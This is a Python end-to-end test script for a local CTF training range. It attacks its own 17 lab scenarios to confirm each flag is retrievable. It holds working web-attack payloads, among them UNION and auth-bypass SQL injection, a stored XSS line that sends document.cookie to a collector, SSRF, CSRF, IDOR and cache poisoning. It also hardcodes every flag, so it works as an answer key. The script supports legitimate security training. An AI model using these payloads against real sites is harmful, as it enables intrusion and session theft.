#!/usr/bin/env python3
"""
CSZone CTF Range — Master End-to-End Verification Suite
Tests all 16 scenarios running on ports 8001 through 8016.
"""
import os
import sys
import re
import base64
import requests

FAILURES = []
HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"

def check(name, condition):
    status = "PASS" if condition else "FAIL"
    print(f"[{status}] {name}")
    if not condition:
        FAILURES.append(name)

def extract_flag(text):
    m = re.search(r"CTF\{[^}]+\}", text)
    return m.group(0) if m else None

def xor_bytes(data_bytes, key_int):
    return bytes([b ^ key_int for b in data_bytes])

def xor_str(data_bytes, key_str):
    key_bytes = key_str.encode("utf-8")
    return "".join(chr(b ^ key_bytes[i % len(key_bytes)]) for i, b in enumerate(data_bytes))

def main():
    print("=" * 70)
    print(f"   CSZone Multi-Port CTF Range Verification Suite (Host: {HOST})")
    print("=" * 70)

    # ── Central Hub (Port 8000) ──────────────────────────────────────────────
    print("\n--- [Central Hub] Port 8000: Central Operations Console ---")
    try:
        r0 = requests.get(f"http://{HOST}:8000/", timeout=3)
        check("Hub: Central Operations Portal reachable", r0.status_code == 200)
        check("Hub: Active target catalog loaded", "Target Operational Console" in r0.text)
        print("     -> Central Hub Status: ONLINE (HTTP 200)")
    except Exception as e:
        check(f"Hub Connection failed: {e}", False)

    # ── Scenario 01 (Port 8001) ──────────────────────────────────────────────
    print("\n--- [Scenario 01] Port 8001: Recon & HTTP Debug Headers ---")
    try:
        r1 = requests.get(f"http://{HOST}:8001/", timeout=3)
        has_clue_comment = "OPS-4471" in r1.text and "strip all debug response headers" in r1.text
        flag_header = r1.headers.get("X-Debug-Info")
        check("S01: HTML developer staging clue present in source comment", has_clue_comment)
        check("S01: X-Debug-Info header flag extracted", flag_header == "CTF{h34d3r_hunt3r_pr0}")
        print(f"     -> Flag: {flag_header}")
    except Exception as e:
        check(f"S01 Connection failed: {e}", False)

    # ── Scenario 02 (Port 8002) ──────────────────────────────────────────────
    print("\n--- [Scenario 02] Port 8002: Robots.txt & Ops Archive Recon ---")
    try:
        r2_rob = requests.get(f"http://{HOST}:8002/robots.txt", timeout=3)
        check("S02: /recon-notes/ disclosed in robots.txt", "Disallow: /recon-notes/" in r2_rob.text)
        r2_dump = requests.get(f"http://{HOST}:8002/recon-notes/ops-archive/session-dump.log", timeout=3)
        m = re.search(r"(Q1RGe[A-Za-z0-9+/=]+)", r2_dump.text)
        token_b64 = m.group(1) if m else ""
        decoded_s02 = base64.b64decode(token_b64).decode("utf-8", errors="ignore")
        check("S02: session-dump.log extracted & Base64 decoded", decoded_s02 == "CTF{r0b0ts_d1scl0s3_p4ths}")
        print(f"     -> Flag: {decoded_s02}")
    except Exception as e:
        check(f"S02 Connection failed: {e}", False)

    # ── Scenario 03 (Port 8003) ──────────────────────────────────────────────
    print("\n--- [Scenario 03] Port 8003: JavaScript & Single-Byte XOR Crypto ---")
    try:
        r3_js = requests.get(f"http://{HOST}:8003/main.js", timeout=3)
        m_c = re.search(r"_w\.__c\s*=\s*'([^']+)'", r3_js.text)
        token_c = m_c.group(1) if m_c else ""
        r3_cfg = requests.get(f"http://{HOST}:8003/js-config.json", timeout=3)
        dbg_key = r3_cfg.json().get("dbg_key", 0)
        decoded_s03 = xor_bytes(base64.b64decode(token_c), dbg_key).decode("utf-8", errors="ignore")
        check("S03: JS property & config XOR decrypted", decoded_s03 == "CTF{unus3d_v4r14bl3_l34k}")
        print(f"     -> Flag: {decoded_s03}")
    except Exception as e:
        check(f"S03 Connection failed: {e}", False)

    # ── Scenario 04 (Port 8004) ──────────────────────────────────────────────
    print("\n--- [Scenario 04] Port 8004: Admin Relocation & Broken Access Control ---")
    try:
        r4_js = requests.get(f"http://{HOST}:8004/main.js", timeout=3)
        m_ref = re.search(r"'(QWRtaW4[^']+)'", r4_js.text)
        ref_b64 = m_ref.group(1) if m_ref else ""
        panel_path = base64.b64decode(ref_b64).decode("utf-8", errors="ignore")
        check("S04: Console log Base64 decoded to panel path", "/panel-7c4f2a/" in panel_path)
        r4_panel = requests.get(f"http://{HOST}:8004/panel-7c4f2a/", timeout=3)
        flag_s04 = extract_flag(r4_panel.text)
        check("S04: Admin panel flag extracted", flag_s04 == "CTF{4dm1n_p4n3l_3xp0s3d}")
        print(f"     -> Flag: {flag_s04}")
    except Exception as e:
        check(f"S04 Connection failed: {e}", False)

    # ── Scenario 05 (Port 8005) ──────────────────────────────────────────────
    print("\n--- [Scenario 05] Port 8005: IDOR Invoices ---")
    try:
        r5 = requests.get(f"http://{HOST}:8005/invoices/invoices.json", timeout=3)
        inv_list = r5.json()
        inv_1007 = next((i for i in inv_list if i.get("id") == 1007), {})
        notes_b64 = inv_1007.get("internal_notes", "")
        flag_s05 = base64.b64decode(notes_b64).decode("utf-8", errors="ignore")
        check("S05: IDOR record 1007 notes extracted & decoded", flag_s05 == "CTF{1d0r_1nv01c3_l34k}")
        print(f"     -> Flag: {flag_s05}")
    except Exception as e:
        check(f"S05 Connection failed: {e}", False)

    # ── Scenario 06 (Port 8006) ──────────────────────────────────────────────
    print("\n--- [Scenario 06] Port 8006: Partner Promo & Client Cookie Guard ---")
    try:
        r6_rob = requests.get(f"http://{HOST}:8006/robots.txt", timeout=3)
        check("S06: robots.txt exposes endpoints", "/promo-page/" in r6_rob.text and "/secure/" in r6_rob.text)

        r6_promo = requests.get(f"http://{HOST}:8006/promo-page/", timeout=3)
        m_pr = re.search(r"<code>([A-Za-z0-9+/=]{20,})</code>", r6_promo.text)
        promo_b64 = m_pr.group(1) if m_pr else ""
        decoded_cred = base64.b64decode(promo_b64).decode("utf-8", errors="ignore")
        check("S06: Promo voucher decoded to admin cookie", decoded_cred == "access_level=admin-9f3a")

        # Secure gateway check with Cookie
        s6 = requests.Session()
        s6.cookies.set("access_level", "admin-9f3a")
        r6_sec = s6.get(f"http://{HOST}:8006/secure/", timeout=3)
        m_sec = re.search(r"<code>([A-Za-z0-9+/=]{20,})</code>", r6_sec.text)
        sec_b64 = m_sec.group(1) if m_sec else ""
        flag_s06_cookie = base64.b64decode(sec_b64).decode("utf-8", errors="ignore")
        check("S06: Cookie authenticated payload decoded", flag_s06_cookie == "CTF{h34d3r_c00k13_byp4ss}")
        print(f"     -> Flag: {flag_s06_cookie}")
    except Exception as e:
        check(f"S06 Connection failed: {e}", False)

    # ── Scenario 07 (Port 8007) ──────────────────────────────────────────────
    print("\n--- [Scenario 07] Port 8007: Backup Service Authentication & Intruder ---")
    try:
        r7_users = requests.get(f"http://{HOST}:8007/backup/users.json", timeout=3)
        user_cfg = r7_users.json()[0]
        check("S07: users.json metadata retrieved", user_cfg.get("username") == "svc_backup")

        # Authenticate with recovered password Summer2024!
        r7_auth = requests.get(f"http://{HOST}:8007/backup/login.html", params={"username": "svc_backup", "password": "Summer2024!"}, timeout=3)
        m_fl = re.search(r"<code>(Q1RGe[^<]+)</code>", r7_auth.text)
        tok_b64 = m_fl.group(1) if m_fl else ""
        flag_s07 = base64.b64decode(tok_b64).decode("utf-8", errors="ignore")
        check("S07: Backup authentication succeeds & returns flag token", flag_s07 == "CTF{h4sh_cr4ck3d_4cc3ss}")
        print(f"     -> Flag: {flag_s07}")
    except Exception as e:
        check(f"S07 Connection failed: {e}", False)

    # ── Scenario 08 (Port 8008) ──────────────────────────────────────────────
    print("\n--- [Scenario 08] Port 8008: Central Security Vault Finale ---")
    try:
        s8 = requests.Session()
        s8.cookies.set("access_level", "admin-9f3a")
        r8 = s8.get(f"http://{HOST}:8008/finale/index.html", params={"key": "Summer2024!"}, timeout=3)
        flag_s08 = extract_flag(r8.text)
        check("S08: Dual-key vault unlock & XOR decryption", flag_s08 == "CTF{f1n4l_ch41n_c0mpl3t3}")
        print(f"     -> Flag: {flag_s08}")
    except Exception as e:
        check(f"S08 Connection failed: {e}", False)

    # ── Scenario 09 (Port 8009) ──────────────────────────────────────────────
    print("\n--- [Scenario 09] Port 8009: Product Filter SQL Injection ---")
    try:
        r9_bool = requests.get(f"http://{HOST}:8009/products", params={"category": "Hardware' OR 1=1 -- -"}, timeout=3)
        check("S09: Boolean SQLi reveals unreleased items", "Prototype Quantum Key Dongle" in r9_bool.text)
        r9_union = requests.get(f"http://{HOST}:8009/products", params={"category": "nonexistent' UNION SELECT title, secret_flag FROM site_secrets -- -"}, timeout=3)
        flag_s09 = extract_flag(r9_union.text)
        check("S09: UNION SQLi extracts flag from site_secrets", flag_s09 == "CTF{un10n_b4s1cs_m4st3r}")
        print(f"     -> Flag: {flag_s09}")
    except Exception as e:
        check(f"S09 Connection failed: {e}", False)

    # ── Scenario 10 (Port 8010) ──────────────────────────────────────────────
    print("\n--- [Scenario 10] Port 8010: Personnel Directory UNION SQLi ---")
    try:
        r10 = requests.get(f"http://{HOST}:8010/directory", params={"q": "nonexistent' UNION SELECT officer_name, clearance_level, master_flag FROM staff_clearances #"}, timeout=3)
        flag_s10 = extract_flag(r10.text)
        check("S10: 3-column UNION extraction from staff_clearances table (# comment)", flag_s10 == "CTF{un10n_s3l3ct_m4st3r}")
        print(f"     -> Flag: {flag_s10}")
    except Exception as e:
        check(f"S10 Connection failed: {e}", False)

    # ── Scenario 11 (Port 8011) ──────────────────────────────────────────────
    print("\n--- [Scenario 11] Port 8011: Enterprise Asset Inventory (Schema SQLi) ---")
    try:
        # Test 1: Check blocked '--' filter
        r11_blocked = requests.get(f"http://{HOST}:8011/inventory", params={"q": 'test" --'}, timeout=3)
        check("S11: '--' comment syntax properly blocked by security filter", "comment syntax is blocked" in r11_blocked.text)

        # Test 2: Check single quote syntax error (double quote required)
        r11_single_quote = requests.get(f"http://{HOST}:8011/inventory", params={"q": "Server' OR 1=1 #"}, timeout=3)
        check("S11: Single quote (') produces syntax error (requires double quote)", r11_single_quote.status_code == 500 and "syntax error" in r11_single_quote.text)

        # Test 3: Double-quote breakout & sqlite_master schema enumeration
        r11_schema = requests.get(f"http://{HOST}:8011/inventory", params={"q": 'nonexistent" UNION SELECT tbl_name, sql, 1, 1 FROM sqlite_master WHERE tbl_name="classified_vault_records" #'}, timeout=3)
        check("S11: Schema enumeration via sqlite_master reveals classified_vault_records table", "classified_vault_records" in r11_schema.text)

        # Test 4: Flag extraction via 4-column typed UNION
        r11_flag = requests.get(f"http://{HOST}:8011/inventory", params={"q": 'nonexistent" UNION SELECT record_name, flag_data, access_pin, vault_level FROM classified_vault_records #'}, timeout=3)
        flag_s11 = extract_flag(r11_flag.text)
        check("S11: 4-column typed UNION extraction captures flag", flag_s11 == "CTF{sch3m4_3num_d0ubl3_qu0t3_m4st3r}")
        print(f"     -> Flag: {flag_s11}")
    except Exception as e:
        check(f"S11 Connection failed: {e}", False)

    # ── Scenario 12 (Port 8012) ──────────────────────────────────────────────
    print("\n--- [Scenario 12] Port 8012: SQLi Auth Bypass + Stored XSS Chain ---")
    try:
        s12 = requests.Session()
        # Plant stored payload
        xss_payload = "<img src=x onerror=\"fetch('/xss/collect?c='+encodeURIComponent(document.cookie))\">"
        s12.post(f"http://{HOST}:8012/guestbook", data={"name": "attacker", "message": xss_payload}, timeout=3)
        r12_gb = s12.get(f"http://{HOST}:8012/guestbook", timeout=3)
        check("S12: Payload stored unescaped in guestbook", xss_payload in r12_gb.text)

        # SQLi Auth Bypass
        r12_login = s12.post(f"http://{HOST}:8012/legacy-admin/login", data={"username": "admin' OR '1'='1' -- -", "password": "x"}, allow_redirects=True, timeout=3)
        admin_cookie = s12.cookies.get("admin_session_flag")
        check("S12: SQLi Auth bypass sets admin_session_flag cookie", admin_cookie == "CTF{st0r3d_c00k13_th3ft}")

        # Simulate browser beacon to collector
        requests.get(f"http://{HOST}:8012/xss/collect", params={"c": f"admin_session_flag={admin_cookie}"}, timeout=3)
        r12_log = requests.get(f"http://{HOST}:8012/xss/collect/log", timeout=3)
        check("S12: Collector log captures exfiltrated flag", "CTF{st0r3d_c00k13_th3ft}" in r12_log.text)
        print(f"     -> Flag: {admin_cookie}")
    except Exception as e:
        check(f"S12 Connection failed: {e}", False)

    # ── Scenario 13 (Port 8013) ──────────────────────────────────────────────
    print("\n--- [Scenario 13] Port 8013: Cross-Site Request Forgery (CSRF) ---")
    try:
        s13 = requests.Session()
        s13.post(f"http://{HOST}:8013/register", data={"username": "csrf_test", "email": "victim@cszone.internal", "password": "VictimPass123!"}, timeout=3)
        s13.post(f"http://{HOST}:8013/login", data={"username": "csrf_test", "password": "VictimPass123!"}, timeout=3)
        # Cross-site POST without CSRF token
        r13 = s13.post(f"http://{HOST}:8013/account/email", data={"email": "hacked@attacker-controlled.test"}, timeout=3)
        flag_s13 = extract_flag(r13.text)
        check("S13: CSRF email modification captures flag", flag_s13 == "CTF{csrf_n0_t0k3n_pwn3d}")
        print(f"     -> Flag: {flag_s13}")
    except Exception as e:
        check(f"S13 Connection failed: {e}", False)

    # ── Scenario 14 (Port 8014) ──────────────────────────────────────────────
    print("\n--- [Scenario 14] Port 8014: Unrestricted File Upload & Stored XSS ---")
    try:
        s14 = requests.Session()
        s14.post(f"http://{HOST}:8014/register", data={"username": "uploader_test", "email": "up@cszone.internal", "password": "UpPass123!"}, timeout=3)
        s14.post(f"http://{HOST}:8014/login", data={"username": "uploader_test", "password": "UpPass123!"}, timeout=3)
        html_payload = b"<html><body><script>console.log('uploaded-xss-ok')</script></body></html>"
        r14_up = s14.post(f"http://{HOST}:8014/upload", files={"file": ("test_pwn.html", html_payload, "text/html")}, timeout=3)
        check("S14: HTML upload accepted", "/static/uploads/test_pwn.html" in r14_up.text)
        r14_get = requests.get(f"http://{HOST}:8014/static/uploads/test_pwn.html", timeout=3)
        check("S14: Uploaded file served with HTML MIME type and script intact", b"<script>" in r14_get.content)
        print("     -> Verified: Stored HTML/JS Execution Enabled")
    except Exception as e:
        check(f"S14 Connection failed: {e}", False)

    # ── Scenario 15 (Port 8015) ──────────────────────────────────────────────
    print("\n--- [Scenario 15] Port 8015: Server-Side Request Forgery (SSRF) ---")
    try:
        s15 = requests.Session()
        s15.post(f"http://{HOST}:8015/register", data={"username": "ssrf_tester", "email": "s@cszone.internal", "password": "SsrfPass123!"}, timeout=3)
        s15.post(f"http://{HOST}:8015/login", data={"username": "ssrf_tester", "password": "SsrfPass123!"}, timeout=3)
        r15 = s15.post(f"http://{HOST}:8015/avatar-import", data={"url": f"http://127.0.0.1:8015/internal/metadata"}, timeout=3)
        flag_s15 = extract_flag(r15.text)
        check("S15: SSRF fetches internal metadata flag", flag_s15 == "CTF{ssrf_1nt3rn4l_m3t4d4t4}")
        print(f"     -> Flag: {flag_s15}")
    except Exception as e:
        check(f"S15 Connection failed: {e}", False)

    # ── Scenario 16 (Port 8016) ──────────────────────────────────────────────
    print("\n--- [Scenario 16] Port 8016: Backend IDOR Orders ---")
    try:
        s16 = requests.Session()
        s16.post(f"http://{HOST}:8016/register", data={"username": "idor_tester", "email": "id@cszone.internal", "password": "IdorPass123!"}, timeout=3)
        s16.post(f"http://{HOST}:8016/login", data={"username": "idor_tester", "password": "IdorPass123!"}, timeout=3)
        r16 = s16.get(f"http://{HOST}:8016/orders/2", timeout=3)
        flag_s16 = extract_flag(r16.text)
        check("S16: IDOR reveals foreign order note & flag", flag_s16 == "CTF{b4ck3nd_1d0r_r34l}")
        print(f"     -> Flag: {flag_s16}")
    except Exception as e:
        check(f"S16 Connection failed: {e}", False)

    # ── Scenario 17 (Port 8017) ──────────────────────────────────────────────
    print("\n--- [Scenario 17] Port 8017: Web Cache Deception & Cache Poisoning ---")
    try:
        s17 = requests.Session()
        s17.post(f"http://{HOST}:8017/login", data={"username": "participant", "password": "Range2024!"}, timeout=3)
        # Authenticated victim primes cache
        poison_path = "/account/profile/legacy-theme.css"
        s17.get(f"http://{HOST}:8017{poison_path}", timeout=3)
        # Unauthenticated request hits cached response
        r17_anon = requests.get(f"http://{HOST}:8017{poison_path}", timeout=3)
        flag_s17 = extract_flag(r17_anon.text)
        check("S17: Cache Deception returns cached profile flag", flag_s17 == "CTF{c4ch3_d3c3pt10n_l34k}")
        check("S17: Cache header indicates HIT", r17_anon.headers.get("X-Cache") == "HIT")

        # Cache Poisoning test
        poison_host = "evil-hacker.test"
        requests.get(f"http://{HOST}:8017/promo/partner-banner", headers={"X-Forwarded-Host": poison_host}, timeout=3)
        r17_clean = requests.get(f"http://{HOST}:8017/promo/partner-banner", timeout=3)
        check("S17: Unkeyed X-Forwarded-Host poisons shared cache", poison_host in r17_clean.text and r17_clean.headers.get("X-Cache") == "HIT")
        print(f"     -> Flag: {flag_s17}")
    except Exception as e:
        check(f"S17 Connection failed: {e}", False)

    print("\n" + "=" * 70)
    if not FAILURES:
        print(" [***] ALL 17 SCENARIOS VERIFIED SUCCESSFULLY! 100% PASS [***]")
    else:
        print(f" [!] {len(FAILURES)} FAILURE(S) DETECTED:")
        for f in FAILURES:
            print(f"     - {f}")
    print("=" * 70)
    sys.exit(0 if not FAILURES else 1)

if __name__ == "__main__":
    main()
